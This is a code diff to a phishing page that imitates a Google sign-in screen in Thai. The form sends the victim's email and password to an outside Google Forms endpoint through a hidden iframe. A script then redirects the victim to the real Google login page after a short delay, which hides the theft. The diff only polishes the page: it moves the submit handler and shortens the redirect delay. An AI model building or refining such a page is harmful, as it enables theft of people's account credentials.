@@ -14,16 +14,20 @@
 <body>
 
 <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
     <h2>ลงชื่อเข้าใช้งาน</h2>
     <p>ใช้บัญชี Google ของคุณ</p>
 
-    <form id="gform" action="https://docs.google.com/forms/d/e/1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q/formResponse" method="POST" target="hidden_iframe">
-        <input type="email" name="entry.1449652638" id="email" placeholder="อีเมลหรือโทรศัพท์" required>
-        <input type="password" name="entry.270012312" id="pass" placeholder="ป้อนรหัสผ่านของคุณ" required>
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q/formResponse" 
+          method="POST" 
+          target="hidden_iframe" 
+          onsubmit="moveOn()">
+        
+        <input type="email" name="entry.1449652638" placeholder="อีเมลหรือโทรศัพท์" required>
+        <input type="password" name="entry.270012312" placeholder="ป้อนรหัสผ่านของคุณ" required>
         
         <div style="margin-top: 40px;">
-            <button type="submit" onclick="moveOn()">ถัดไป</button>
+            <button type="submit">ถัดไป</button>
         </div>
     </form>
 </div>
@@ -34,8 +38,8 @@
     function moveOn() {
         // รอให้ฟอร์มส่งข้อมูลครู่หนึ่งแล้วเด้งไปหน้าจริง
         setTimeout(() => {
-            window.location.href = "https://accounts.google.com";
-        }, 1000);
+            window.location.href = "https://accounts.google.com/v3/signin/identifier";
+        }, 800);
     }
 </script>
 
